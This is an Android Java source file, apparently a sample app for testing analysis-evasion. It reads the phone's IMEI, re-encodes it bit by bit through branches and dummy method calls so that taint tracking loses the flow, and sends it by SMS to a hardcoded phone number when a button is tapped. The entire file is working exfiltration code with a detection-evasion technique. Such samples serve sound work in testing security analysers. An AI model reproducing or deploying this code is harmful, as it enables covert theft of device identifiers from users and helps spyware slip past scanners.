package com.examples.evasion.bvb.bnrdifinfovasion;

       import android.app.PendingIntent;
       import android.content.Context;
       import android.content.Intent;
       import android.os.Build;
       import android.support.annotation.RequiresApi;
       import android.support.v7.app.AppCompatActivity;
       import android.os.Bundle;
       import android.telephony.SmsManager;
       import android.telephony.TelephonyManager;
       import android.view.View;
       import android.widget.Button;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    protected int X[];
    public String mobileNo = "+919825046179";
    String results = "";


    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String binaryIMEI = "";

        Button button = (Button) findViewById(R.id.sendMsg);

        binaryIMEI = stringToBinary(getIMEI(this));
        char[] list = binaryIMEI.toCharArray();

        X = new int[binaryIMEI.length()];

        for (int i = 0; i < binaryIMEI.length(); i++) {
            X[i] = Character.digit(list[i], 10);
        }

        for (int i = 0; i < X.length; i++) {
            if (X[i] == 1) {
                method1();
                results = results + "1";
            } else {
                method3();
                results = results + "0";
            }
        }

        button.setOnClickListener(this);

    }

    public String getIMEI(Context context) {
        TelephonyManager mngr = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        String imei = mngr.getDeviceId();
        return imei;
    }

    public static String stringToBinary(String str) {

        String result = "";
        char[] messChar = str.toCharArray();

        for (int i = 0; i < messChar.length; i++) {
            result += Integer.toBinaryString(messChar[i]);
        }
        return result;
    }

    public String method1(){
        return method2();
    }

    public String method2(){
        return "1";
    }

    public String method3(){
        return method4();
    }

    public String method4(){
        return "0";
    }

    public void preMethod(){
        message();
    }

    public void message(){
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);
        //Get the SmsManager instance and call the sendTextMessage method to send message
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(mobileNo, null, results, pi, null);
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.sendMsg:
                //sendMsg();
                //Getting intent and PendingIntent instance
                preMethod();
                break;
        }
    }


}
